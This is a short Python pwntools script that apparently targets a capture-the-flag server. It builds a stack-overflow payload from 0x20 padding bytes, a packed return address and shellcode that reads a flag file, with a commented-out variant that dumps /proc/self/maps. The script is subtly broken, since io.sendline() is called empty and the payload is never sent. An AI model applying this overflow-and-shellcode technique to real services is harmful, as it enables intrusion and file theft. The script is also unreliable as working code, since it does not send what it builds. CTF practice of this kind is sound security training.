from pwn import *

io = remote('pyttemjuk-1.play.hfsc.tf', 1337)

#pl = 'a'*0x20
#pl += p32(0x60fea0)
#pl += asm(shellcraft.cat('/proc/self/maps'))

pl = 'a'*0x20
pl += p32(0x60fea0)
pl += asm(shellcraft.cat('/home/ctf/.wine/drive_c/flag.txt'))

io.sendline()

print(io.recvall())
